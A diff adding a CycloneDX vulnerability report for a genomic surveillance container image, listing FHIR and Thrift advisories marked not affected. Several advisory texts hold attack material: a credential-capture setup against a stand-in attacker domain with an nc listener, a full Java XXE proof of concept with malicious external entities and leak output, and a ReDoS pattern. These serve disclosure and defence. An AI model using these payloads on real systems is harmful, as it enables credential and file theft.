@@ -1,0 +1,827 @@
+{
+  "bomFormat" : "CycloneDX",
+  "specVersion" : "1.5",
+  "serialNumber" : "urn:uuid:16cfc31b-5668-4229-a181-6eb5211169fe",
+  "version" : 1,
+  "metadata" : {
+    "timestamp" : "2026-08-14T09:42:36Z",
+    "tools" : [
+      {
+        "vendor" : "OWASP",
+        "name" : "Dependency-Track",
+        "version" : "4.14.2-gematik-15"
+      }
+    ],
+    "component" : {
+      "type" : "container",
+      "bom-ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22",
+      "name" : "Integrierte-Genomische-Surveillance-Service (Docker Image)",
+      "version" : "1.6.0 (Main)"
+    }
+  },
+  "vulnerabilities" : [
+    {
+      "bom-ref" : "818931df-219a-4598-b409-067a6b9cb51a",
+      "id" : "GHSA-p7m9-v2cm-2h7m",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 9.8,
+          "severity" : "critical",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "cwes" : [
+        200
+      ],
+      "description" : "### Impact\nWhen setting headers in HTTP requests, the internal HTTP client sends headers first to the host in the initial URL but also, if asked to follow redirects and a 30X HTTP response code is returned, to the host mentioned in URL in the Location: response header value.\n\nSending the same set of headers to subsequent hosts is a problem as this header often contains privacy sensitive information or data that could allow others to impersonate the  client's request.\n\n### Patches\nThis issue has been patched in release 6.8.3 \n\n### Workarounds\nNone.",
+      "published" : "2026-03-18T20:07:49Z",
+      "updated" : "2026-03-25T18:12:02Z",
+      "analysis" : {
+        "state" : "not_affected",
+        "response" : [
+          "update"
+        ]
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "7e29c070-faa1-4777-9ee2-6c4d9e6f4ed4",
+      "id" : "GHSA-fgv2-4q4g-wc35",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.4,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        }
+      ],
+      "cwes" : [
+        346
+      ],
+      "description" : "## Summary\n\n`ManagedWebAccessUtils.getServer()` uses `String.startsWith()` to match request URLs against configured server URLs for authentication credential dispatch. Because configured server URLs (e.g., `http://tx.fhir.org`) lack a trailing slash or host boundary check, an attacker-controlled domain like `http://tx.fhir.org.attacker.com` matches the prefix and receives Bearer tokens, Basic auth credentials, or API keys when the HTTP client follows a redirect to that domain.\n\n## Details\n\nThe root cause is in `ManagedWebAccessUtils.getServer()` at `org.hl7.fhir.utilities/src/main/java/org/hl7/fhir/utilities/http/ManagedWebAccessUtils.java:26`:\n\n```java\npublic static ServerDetailsPOJO getServer(String url, Iterable<ServerDetailsPOJO> serverAuthDetails) {\n    if (serverAuthDetails != null) {\n      for (ServerDetailsPOJO serverDetails : serverAuthDetails) {\n          if (url.startsWith(serverDetails.getUrl())) {  // <-- no host boundary check\n            return serverDetails;\n          }\n      }\n    }\n    return null;\n}\n```\n\nThe configured production terminology server URL is defined without a trailing slash in `FhirSettingsPOJO.java:19`:\n\n```java\nprotected static final String TX_SERVER_PROD = \"http://tx.fhir.org\";\n```\n\nThis means:\n- `\"http://tx.fhir.org.attacker.com/capture\".startsWith(\"http://tx.fhir.org\")` → **true**\n- `\"http://tx.fhir.org:8080/evil\".startsWith(\"http://tx.fhir.org\")` → **true**\n\n**Exploit chain via SimpleHTTPClient (redirect path):**\n\n1. `SimpleHTTPClient.get()` (`SimpleHTTPClient.java:68-105`) makes a request to `http://tx.fhir.org/ValueSet/$expand`\n2. On each redirect, the loop calls `getHttpGetConnection(url, accept)` (line 84) → `setHeaders(connection)` (line 117)\n3. `setHeaders()` (line 122-133) calls `authProvider.canProvideHeaders(url)` and `authProvider.getHeaders(url)` on the **redirect target URL**\n4. `ServerDetailsPOJOHTTPAuthProvider.getServerDetails()` (line 83-84) delegates to `ManagedWebAccessUtils.getServer(url.toString(), servers)`\n5. The `startsWith()` check matches `http://tx.fhir.org.attacker.com` against `http://tx.fhir.org`\n6. Credentials are dispatched to the attacker's server via `ServerDetailsPOJOHTTPAuthProvider.getHeaders()` (lines 38-58):\n   - Bearer tokens: `Authorization: Bearer {token}`\n   - Basic auth: `Authorization: Basic {base64(user:pass)}`\n   - API keys: `Api-Key: {apikey}`\n   - Custom headers from server config\n\nNote: An earlier fix (commit `6b615880` \"Strip headers on redirect\") added an `isNotSameHost()` check, but this was **removed** in commit `3871cc69` (\"Rework authorization providers in ManagedWebAccess\"). The current code on master has no host validation during redirect following.\n\n**Exploit chain via ManagedFhirWebAccessor (OkHttp path):**\n\n`ManagedFhirWebAccessor.httpCall()` (line 81-112) sets auth headers via `requestWithAuthorizationHeaders()` before passing the request to OkHttpClient. OkHttpClient follows redirects by default (up to 20) and carries the pre-set auth headers to all redirect targets. The same `startsWith()` check in `canProvideHeaders()` applies.\n\nThe same vulnerable pattern also exists in `ManagedWebAccess.isLocal()` (line 214), where `url.startsWith(server.getUrl())` is used to determine whether HTTP (non-TLS) access is allowed, potentially enabling TLS downgrade for attacker-controlled domains that match the prefix.\n\n## PoC\n\n**Step 1: Verify the prefix match behavior**\n\n```java\n// This demonstrates the core vulnerability\nString configuredUrl = \"http://tx.fhir.org\";  // FhirSettingsPOJO.TX_SERVER_PROD\nString attackerUrl = \"http://tx.fhir.org.attacker.com/capture\";\n\nSystem.out.println(attackerUrl.startsWith(configuredUrl));\n// Output: true\n```\n\n**Step 2: Demonstrate credential dispatch to wrong host**\n\nGiven a `fhir-settings.json` configuration at `~/.fhir/fhir-settings.json`:\n```json\n{\n  \"servers\": [\n    {\n      \"url\": \"http://tx.fhir.org\",\n      \"authenticationType\": \"token\",\n      \"token\": \"secret-bearer-token-12345\"\n    }\n  ]\n}\n```\n\nWhen `SimpleHTTPClient.get(\"http://tx.fhir.org/ValueSet/$expand\")` follows a 302 redirect to `http://tx.fhir.org.attacker.com/capture`:\n\n1. `setHeaders()` is called with the redirect target URL\n2. `authProvider.canProvideHeaders(new URL(\"http://tx.fhir.org.attacker.com/capture\"))` returns `true`\n3. `authProvider.getHeaders(...)` returns `{\"Authorization\": \"Bearer secret-bearer-token-12345\"}`\n4. The `Authorization` header with the secret token is sent to `tx.fhir.org.attacker.com`\n\n**Step 3: Attacker captures the credential**\n\n```bash\n# On attacker-controlled server (tx.fhir.org.attacker.com)\nnc -l -p 80 | head -20\n# Output includes:\n# GET /capture HTTP/1.1\n# Host: tx.fhir.org.attacker.com\n# Authorization: Bearer secret-bearer-token-12345\n```\n\n## Impact\n\n- **Credential theft**: Bearer tokens, Basic authentication passwords, API keys, and custom authentication headers configured for FHIR terminology servers can be exfiltrated by an attacker who can inject a redirect (via MITM, compromised CDN, or DNS poisoning).\n- **Impersonation**: Stolen credentials allow an attacker to make authenticated requests to the legitimate FHIR server, potentially accessing or modifying clinical terminology data.\n- **Broad exposure**: The FHIR Validator is widely used in healthcare IT for validating FHIR resources. Any deployment that configures server authentication in `fhir-settings.json` and makes outbound HTTP requests to terminology servers is affected.\n- **TLS downgrade**: The same `startsWith()` pattern in `ManagedWebAccess.isLocal()` could allow an attacker-controlled domain to be treated as \"local,\" bypassing the HTTPS enforcement.\n\n## Recommended Fix\n\nReplace the `startsWith()` check in `ManagedWebAccessUtils.getServer()` with proper URL host boundary validation:\n\n```java\npublic static ServerDetailsPOJO getServer(String url, Iterable<ServerDetailsPOJO> serverAuthDetails) {\n    if (serverAuthDetails != null) {\n      for (ServerDetailsPOJO serverDetails : serverAuthDetails) {\n          if (urlMatchesServer(url, serverDetails.getUrl())) {\n            return serverDetails;\n          }\n      }\n    }\n    return null;\n}\n\n/**\n * Check if a URL matches a configured server URL with proper host boundary validation.\n * After the configured prefix, the next character must be '/', '?', '#', ':', or end-of-string.\n */\nprivate static boolean urlMatchesServer(String url, String serverUrl) {\n    if (url == null || serverUrl == null) return false;\n    if (!url.startsWith(serverUrl)) return false;\n    if (url.length() == serverUrl.length()) return true;\n    char nextChar = url.charAt(serverUrl.length());\n    return nextChar == '/' || nextChar == '?' || nextChar == '#' || nextChar == ':';\n}\n```\n\nApply the same fix to `ManagedWebAccess.isLocal()` at line 214 and the three-argument `getServer()` overload at line 14.\n\nAdditionally, consider re-introducing the host-equality check for redirects in `SimpleHTTPClient` (as was previously implemented in commit `6b615880` but removed in `3871cc69`) to provide defense-in-depth against credential leakage on cross-origin redirects.",
+      "published" : "2026-03-30T17:19:21Z",
+      "updated" : "2026-03-31T18:55:22Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "21913c34-1522-470b-8c5c-28bb4697ea76",
+      "id" : "CVE-2026-33180",
+      "source" : {
+        "name" : "NVD",
+        "url" : "https://nvd.nist.gov/"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "NVD",
+            "url" : "https://nvd.nist.gov/"
+          },
+          "score" : 7.5,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "cwes" : [
+        200,
+        201
+      ],
+      "description" : "HAPI FHIR is a complete implementation of the HL7 FHIR standard for healthcare interoperability in Java. Prior to version 6.9.0, when setting headers in HTTP requests, the internal HTTP client sends headers first to the host in the initial URL but also, if asked to follow redirects and a 30X HTTP response code is returned, to the host mentioned in URL in the Location: response header value. Sending the same set of headers to subsequent hosts is a problem as this header often contains privacy sensitive information or data that could allow others to impersonate the  client's request. This issue has been patched in release 6.9.0. No known workarounds are available.",
+      "published" : "2026-03-20T23:16:45Z",
+      "updated" : "2026-07-15T02:20:03Z",
+      "analysis" : {
+        "state" : "not_affected",
+        "justification" : "code_not_reachable"
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "980068bd-7010-4129-b476-c3242c9765ec",
+      "id" : "CVE-2026-34359",
+      "source" : {
+        "name" : "NVD",
+        "url" : "https://nvd.nist.gov/"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "NVD",
+            "url" : "https://nvd.nist.gov/"
+          },
+          "score" : 9.1,
+          "severity" : "critical",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        }
+      ],
+      "cwes" : [
+        346
+      ],
+      "description" : "HAPI FHIR is a complete implementation of the HL7 FHIR standard for healthcare interoperability in Java. Prior to version 6.9.4, ManagedWebAccessUtils.getServer() uses String.startsWith() to match request URLs against configured server URLs for authentication credential dispatch. Because configured server URLs (e.g., http://tx.fhir.org) lack a trailing slash or host boundary check, an attacker-controlled domain like http://tx.fhir.org.attacker.com matches the prefix and receives Bearer tokens, Basic auth credentials, or API keys when the HTTP client follows a redirect to that domain. This issue has been patched in version 6.9.4.",
+      "published" : "2026-03-31T17:16:31Z",
+      "updated" : "2026-07-24T20:10:00Z",
+      "analysis" : {
+        "state" : "not_affected",
+        "justification" : "code_not_reachable"
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "468aedb6-7fc7-4d7f-b89d-51b68662cf66",
+      "id" : "GHSA-7pwc-h2j2-rjgj",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.3,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
+        }
+      ],
+      "cwes" : [
+        297
+      ],
+      "description" : "Improper Validation of Certificate with Host Mismatch vulnerability in Apache Thrift.\n\nThis issue affects Apache Thrift: before 0.23.0.\n\nUsers are recommended to upgrade to version [0.23.0](https://github.com/apache/thrift/releases/tag/v0.23.0), which fixes the issue.",
+      "published" : "2026-05-05T09:31:55Z",
+      "updated" : "2026-06-02T22:10:44Z",
+      "analysis" : {
+        "state" : "not_affected",
+        "justification" : "requires_configuration",
+        "detail" : "Only the Apache Thirst Server is affected."
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "b80e37b1-60f2-46ee-8302-840bb11ccb8c",
+      "id" : "GHSA-3653-68v6-rq57",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.5,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes" : [
+        1333
+      ],
+      "description" : "## Summary\n\nAll implementations of FHIRPathEngine accept arbitrary FHIRPath expressions and evaluate them without input validation. The FHIRPath functions `matches()`, `matchesFull()`, and `replaceMatches()` pass user-controlled regular expressions directly to Java's `Pattern.compile()` and `String.replaceAll()` without complexity checks or timeouts. An attacker can send a resource containing an evil regex pattern that causes catastrophic backtracking, exhausting system resources, and causing Denial-of-Service.\n\n## Details\n\nThe vulnerability exists in regex execution in FHIRPathEngine implementations across multiple code modules. For example the org.hl7.fhir.r5 module:\n\n\n**Entry point 1 — `FHIRPathEngine.java:5929` (R5 `funcMatches`):**\n```java\nprivate List<Base> funcMatches(ExecutionContext context, List<Base> focus, ExpressionNode exp) {\n    String sw = convertToString(swb); // attacker-controlled regex pattern\n    // ...\n    Pattern p = Pattern.compile(\"(?s)\" + sw); // VULNERABLE: no complexity check\n    Matcher m = p.matcher(st);                // no timeout\n    boolean ok = m.find();\n```\n\n**Entry point 2 — `FHIRPathEngine.java:5951` (R5 `funcMatchesFull`):**\n```java\nPattern p = Pattern.compile(\"(?s)\" + sw); // VULNERABLE: same pattern\nMatcher m = p.matcher(st);\nboolean ok = m.matches();\n```\n\n**Entry point 3 — `FHIRPathEngine.java:5120` (R5 `funcReplaceMatches`):**\n```java\nresult.add(new StringType(convertToString(focus.get(0))\n    .replaceAll(regex, repl)).noExtensions()); // VULNERABLE: replaceAll uses Pattern internally\n```\n\nThe same vulnerabilities exist in the dstu2, dstu2016may, dstu3, r4, and r4b modules, and the FHIRPathEngine is used in the validation module functionality.\n\n**Why this is exploitable:**\n- No timeout mechanism covers FHIRPath evaluation — the `ValidationTimeout` class only protects `InstanceValidator` operations, not `evaluateFhirPath()`\n- Java's `Pattern.compile()` with a pattern like `(a+)+$` against input `\"aaaaaaaaaaaaaaaaaaaaaa!\"` causes exponential backtracking (O(2^n) time complexity)\n\n\n## Impact\n\n- **CPU Exhaustion:** The exponential backtracking in Java's regex engine consumes 100% of a CPU core for the duration of the hang (effectively infinite for sufficiently long input strings) for callers of FHIRPathEngine.",
+      "published" : "2026-05-18T20:23:54Z",
+      "updated" : "2026-05-18T20:23:55Z",
+      "analysis" : {
+        "state" : "not_affected",
+        "justification" : "code_not_present"
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "4309d8af-e1c4-4b46-a02d-a4828b4c7265",
+      "id" : "GHSA-2f55-g35j-5jmf",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 9.2,
+          "severity" : "critical",
+          "method" : "CVSSv4",
+          "vector" : "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N"
+        }
+      ],
+      "cwes" : [
+        611
+      ],
+      "description" : "### Summary\n\n`org.hl7.fhir.utilities.XsltUtilities` exposes two parallel families of XSLT\ntransform helpers. The `transform(...)` overloads obtain their\n`TransformerFactory` from the project's hardened helper\n`XMLUtil.newXXEProtectedTransformerFactory()` (which sets\n`ACCESS_EXTERNAL_DTD=\"\"` and `ACCESS_EXTERNAL_STYLESHEET=\"\"`). The sibling\n`saxonTransform(...)` overloads instead instantiate a **bare**\n`new net.sf.saxon.TransformerFactoryImpl()` with no external-access\nrestriction. A document transformed through any `saxonTransform(...)` overload\nis parsed with external general entities and external DTD/parameter entities\nenabled, so an attacker who controls (or can MITM) the transformed XML obtains\nXML External Entity injection: local file disclosure and blind XXE / SSRF to\narbitrary URLs reachable from the host.\n\n`XMLUtil` documents that its protected factory \"should be the only place where\nTransformerFactory is instantiated in this project\". The `saxonTransform`\noverloads violate that contract while their same-file `transform` siblings\nhonour it.\n\n### Affected versions\n\n`org.hl7.fhir.utilities` (Maven `ca.uhn.hapi.fhir:org.hl7.fhir.utilities`)\n`<= 6.9.8` (latest release at time of report; verified live on `6.9.8`).\nThe bare `net.sf.saxon.TransformerFactoryImpl()` instantiation is present at\n`XsltUtilities.java:61`, `:91`, and `:106`.\n\n### Privilege required\n\nNone at the library boundary. The exposure depends on the calling tool: any\nFHIR component that runs `XsltUtilities.saxonTransform(...)` over XML whose\nsource document, embedded DTD, or referenced stylesheet is attacker-influenced\n(an IG package, a fetched/uploaded resource, a downloaded stylesheet, or a\nMITM'd HTTP fetch) triggers the XXE. No DOCTYPE/entity stripping occurs before\nthe Saxon parser sees the bytes.\n\n### Root cause\n\n`org.hl7.fhir.utilities/src/main/java/org/hl7/fhir/utilities/XsltUtilities.java`:\n\n```java\n// VULNERABLE — bare factory, no external-access restriction (lines 60-73, 90-99, 105-128)\npublic static byte[] saxonTransform(Map<String, byte[]> files, byte[] source, byte[] xslt) throws TransformerException {\n    TransformerFactory f = new net.sf.saxon.TransformerFactoryImpl();   // <-- bare\n    f.setAttribute(\"http://saxon.sf.net/feature/version-warning\", Boolean.FALSE);\n    StreamSource xsrc = new StreamSource(new ByteArrayInputStream(xslt));\n    f.setURIResolver(new ZipURIResolver(files));\n    Transformer t = f.newTransformer(xsrc);\n    ...\n}\npublic static String saxonTransform(String source, String xslt) throws TransformerException, IOException {\n    TransformerFactoryImpl f = new net.sf.saxon.TransformerFactoryImpl();   // <-- bare\n    ...\n}\n\n// HARDENED SIBLING (same file, lines 75-88 / 130-149) — negative control\npublic static byte[] transform(Map<String, byte[]> files, byte[] source, byte[] xslt) throws TransformerException {\n    TransformerFactory f = org.hl7.fhir.utilities.xml.XMLUtil.newXXEProtectedTransformerFactory(); // <-- hardened\n    ...\n}\n```\n\nThe hardened helper (`XMLUtil.newXXEProtectedTransformerFactory()`) is:\n\n```java\npublic static TransformerFactory newXXEProtectedTransformerFactory() {\n    final TransformerFactory transformerFactory = TransformerFactory.newInstance();\n    transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\n    transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");\n    return transformerFactory;\n}\n```\n\nThe `saxonTransform` overloads never call this helper and never set the two\n`ACCESS_EXTERNAL_*` attributes, so the underlying parser resolves external\ngeneral entities (`<!ENTITY x SYSTEM \"file:///...\">`) and external\nDTD/parameter entities (`<!ENTITY % p SYSTEM \"http://attacker/\">`). This is a\nclassic CWE-611. The asymmetry — one family hardened, the co-located sibling\nfamily bare — is the bug: the protection that already exists in the same class\nwas not extended to the `saxonTransform` variants.\n\n### Reproduction (E2E against published Maven Central `org.hl7.fhir.utilities:6.9.8`)\n\nA self-contained Maven project. `pom.xml` pulls the latest released artifact,\nwhich transitively brings `net.sf.saxon:Saxon-HE:11.6`.\n\n`pom.xml`:\n\n```xml\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\">\n  <modelVersion>4.0.0</modelVersion>\n  <groupId>poc</groupId><artifactId>fhir-xslt-xxe-poc</artifactId><version>1.0</version>\n  <properties>\n    <maven.compiler.source>17</maven.compiler.source>\n    <maven.compiler.target>17</maven.compiler.target>\n  </properties>\n  <dependencies>\n    <dependency>\n      <groupId>ca.uhn.hapi.fhir</groupId>\n      <artifactId>org.hl7.fhir.utilities</artifactId>\n      <version>6.9.8</version>\n    </dependency>\n  </dependencies>\n</project>\n```\n\n`src/main/java/Poc.java`:\n\n```java\nimport org.hl7.fhir.utilities.XsltUtilities;\nimport java.io.*;\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.*;\nimport java.util.*;\n\npublic class Poc {\n  static final String CANARY_MARK = \"TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2\";\n  // identity stylesheet: copies the resolved //data text into the output\n  static final String IDENTITY_XSLT =\n      \"<?xml version=\\\"1.0\\\"?>\\n\" +\n      \"<xsl:stylesheet version=\\\"1.0\\\" xmlns:xsl=\\\"http://www.w3.org/1999/XSL/Transform\\\">\\n\" +\n      \"  <xsl:output method=\\\"text\\\"/>\\n\" +\n      \"  <xsl:template match=\\\"/\\\"><xsl:value-of select=\\\"//data\\\"/></xsl:template>\\n\" +\n      \"</xsl:stylesheet>\\n\";\n\n  public static void main(String[] args) throws Exception {\n    Path secret = Files.createTempFile(\"fhir-secret-\", \".txt\");\n    Files.writeString(secret, CANARY_MARK + \" :: \" + UUID.randomUUID());\n\n    final List<String> oobHits = Collections.synchronizedList(new ArrayList<>());\n    ServerSocket sentinel = new ServerSocket(0);\n    int oobPort = sentinel.getLocalPort();\n    Thread st = new Thread(() -> {\n      try {\n        while (!sentinel.isClosed()) {\n          Socket s = sentinel.accept();\n          BufferedReader r = new BufferedReader(new InputStreamReader(s.getInputStream(), StandardCharsets.UTF_8));\n          String line = r.readLine();\n          if (line != null) { oobHits.add(line); System.out.println(\"[SENTINEL] inbound connection: \" + line); }\n          byte[] body = \"<!-- ok -->\".getBytes(StandardCharsets.UTF_8); // well-formed empty external DTD\n          OutputStream os = s.getOutputStream();\n          os.write((\"HTTP/1.1 200 OK\\r\\nContent-Type: application/xml-dtd\\r\\nContent-Length: \" + body.length + \"\\r\\n\\r\\n\").getBytes());\n          os.write(body); os.flush(); s.close();\n        }\n      } catch (IOException ignored) {}\n    });\n    st.setDaemon(true); st.start();\n\n    // A1: external general entity -> local secret (file read)\n    // A2: external parameter entity -> attacker URL (blind XXE / SSRF)\n    String maliciousSource =\n        \"<?xml version=\\\"1.0\\\"?>\\n\" +\n        \"<!DOCTYPE root [\\n\" +\n        \"  <!ENTITY canary SYSTEM \\\"\" + secret.toUri() + \"\\\">\\n\" +\n        \"  <!ENTITY % oob SYSTEM \\\"http://127.0.0.1:\" + oobPort + \"/evil-fhir-xslt-ssrf.dtd\\\">\\n\" +\n        \"  %oob;\\n\" +\n        \"]>\\n\" +\n        \"<root><data>&canary;</data></root>\\n\";\n    Path srcFile = Files.createTempFile(\"fhir-malicious-src-\", \".xml\");\n    Files.writeString(srcFile, maliciousSource);\n    Path xsltFile = Files.createTempFile(\"fhir-identity-\", \".xslt\");\n    Files.writeString(xsltFile, IDENTITY_XSLT);\n\n    System.out.println(\"=== Target: org.hl7.fhir.utilities:6.9.8 (XsltUtilities) on JDK \" + System.getProperty(\"java.version\") + \" ===\");\n    System.out.println(\"=== Saxon: \" + saxonVersion() + \" ===\");\n    System.out.println(\"Secret file: \" + secret + \" (contains \" + CANARY_MARK + \")\");\n    System.out.println(\"OOB sentinel: http://127.0.0.1:\" + oobPort + \"/\\n\");\n\n    System.out.println(\"---- ATTACK: XsltUtilities.saxonTransform(source, xslt)  [BARE TransformerFactoryImpl] ----\");\n    try {\n      String out = XsltUtilities.saxonTransform(srcFile.toString(), xsltFile.toString());\n      System.out.println(\"transform output: [\" + out.trim() + \"]\");\n      System.out.println(out.contains(CANARY_MARK)\n        ? \">>> XXE CONFIRMED: canary leaked into XSLT output via external entity <<<\"\n        : \">>> canary NOT in output <<<\");\n    } catch (Exception e) { System.out.println(\"saxonTransform threw: \" + e); }\n    Thread.sleep(400);\n    System.out.println(\"OOB sentinel hits after BARE call: \" + oobHits + \"\\n\");\n\n    // Direct factory comparison (isolates the hardening difference)\n    System.out.println(\"---- DIRECT FACTORY COMPARISON (same malicious source, identity XSLT) ----\");\n    int b = oobHits.size();\n    System.out.println(\"[bare new TransformerFactoryImpl()]\");\n    runDirect(new net.sf.saxon.TransformerFactoryImpl(), srcFile, xsltFile, oobHits, b);\n    int b2 = oobHits.size();\n    System.out.println(\"[hardened XMLUtil.newXXEProtectedTransformerFactory()]\");\n    runDirect(org.hl7.fhir.utilities.xml.XMLUtil.newXXEProtectedTransformerFactory(), srcFile, xsltFile, oobHits, b2);\n    sentinel.close();\n  }\n\n  static void runDirect(javax.xml.transform.TransformerFactory f, Path srcFile, Path xsltFile, List<String> oobHits, int before) throws Exception {\n    try {\n      javax.xml.transform.Transformer t = f.newTransformer(new javax.xml.transform.stream.StreamSource(Files.newInputStream(xsltFile)));\n      ByteArrayOutputStream out = new ByteArrayOutputStream();\n      t.transform(new javax.xml.transform.stream.StreamSource(Files.newInputStream(srcFile)), new javax.xml.transform.stream.StreamResult(out));\n      String s = out.toString(StandardCharsets.UTF_8).trim();\n      System.out.println(\"  output: [\" + s + \"]\");\n      System.out.println(\"  canary leaked: \" + s.contains(CANARY_MARK));\n    } catch (Exception e) {\n      System.out.println(\"  threw: \" + e.getClass().getName() + \": \" + String.valueOf(e.getMessage()).replaceAll(\"[\\\\u4e00-\\\\u9fff]\", \"?\"));\n    }\n    Thread.sleep(300);\n    System.out.println(\"  OOB sentinel hits from this call: \" + (oobHits.size() - before));\n  }\n\n  static String saxonVersion() {\n    try { return (String) Class.forName(\"net.sf.saxon.Version\").getMethod(\"getProductVersion\").invoke(null); }\n    catch (Throwable t) { return \"unknown\"; }\n  }\n}\n```\n\nRun + **verbatim captured output** (JDK 17.0.18, Saxon-HE 11.6; CJK in the\nhardened-path SAXParseException replaced with `?` by the harness for ASCII\ndisplay, the message text is `accessExternalDTD ... restriction ... 'http'\naccess not allowed`):\n\n```\n$ mvn -q compile && mvn -q exec:java -Dexec.mainClass=Poc\n=== Target: org.hl7.fhir.utilities:6.9.8 (XsltUtilities) on JDK 17.0.18 ===\n=== Saxon: 11.6 ===\nSecret file: /var/folders/.../fhir-secret-467000002121832365.txt (contains TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2)\nOOB sentinel: http://127.0.0.1:62466/\n\n---- ATTACK: XsltUtilities.saxonTransform(source, xslt)  [BARE TransformerFactoryImpl] ----\n[SENTINEL] inbound connection: GET /evil-fhir-xslt-ssrf.dtd HTTP/1.1\ntransform output: [TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2 :: 4e3c33aa-4db1-4f22-880f-6666fedd9da4]\n>>> XXE CONFIRMED: canary leaked into XSLT output via external entity <<<\nOOB sentinel hits after BARE call: [GET /evil-fhir-xslt-ssrf.dtd HTTP/1.1]\n\n---- DIRECT FACTORY COMPARISON (same malicious source, identity XSLT) ----\n[bare new TransformerFactoryImpl()]\n[SENTINEL] inbound connection: GET /evil-fhir-xslt-ssrf.dtd HTTP/1.1\n  output: [TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2 :: 4e3c33aa-4db1-4f22-880f-6666fedd9da4]\n  canary leaked: true\n  OOB sentinel hits from this call: 1\n[hardened XMLUtil.newXXEProtectedTransformerFactory()]\n  threw: net.sf.saxon.trans.XPathException: org.xml.sax.SAXParseException; lineNumber: 5; columnNumber: 8; ????: ???????? 'evil-fhir-xslt-ssrf.dtd', ?? accessExternalDTD ???????????? 'http' ??.\n  OOB sentinel hits from this call: 0\n```\n\nInterpretation of the verbatim output:\n\n- **Bare path** (`saxonTransform` and bare `TransformerFactoryImpl`): the local\n  secret file content (`TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2 :: ...`) is leaked\n  into the transform output (file disclosure), and the OOB sentinel receives\n  `GET /evil-fhir-xslt-ssrf.dtd HTTP/1.1` (blind XXE / SSRF). `canary leaked: true`,\n  OOB hits = 1.\n- **Hardened path** (`XMLUtil.newXXEProtectedTransformerFactory()`): parsing the\n  same malicious source throws an `accessExternalDTD ... 'http' access not\n  allowed` SAXParseException and the OOB sentinel receives 0 hits. The only\n  difference between the two runs is the factory: the existing project helper\n  blocks the attack, the bare sibling does not.\n\n### Impact\n\n- **Local file disclosure**: any file readable by the JVM process is exfiltrated\n  into the transform output (demonstrated above with a canary secret file).\n- **Blind XXE / SSRF**: external parameter/DTD entities cause the host to issue\n  attacker-directed HTTP(S) requests (demonstrated by the sentinel hit),\n  enabling internal-network probing and cloud metadata access from the host's\n  network position.\n- The `saxonTransform` overloads are part of the public\n  `org.hl7.fhir.utilities` API consumed across the FHIR Java tooling\n  (IG-publisher / validation / conversion utilities); any consumer that routes\n  attacker-influenced or MITM-able XML through them inherits the XXE.\n\n### Suggested fix\n\nRoute the `saxonTransform` overloads through the same protection the\n`transform` siblings already use. Because these overloads specifically need the\nSaxon implementation, obtain a Saxon factory and apply the two `ACCESS_EXTERNAL_*`\nrestrictions (mirroring `XMLUtil.newXXEProtectedTransformerFactory()`), e.g. 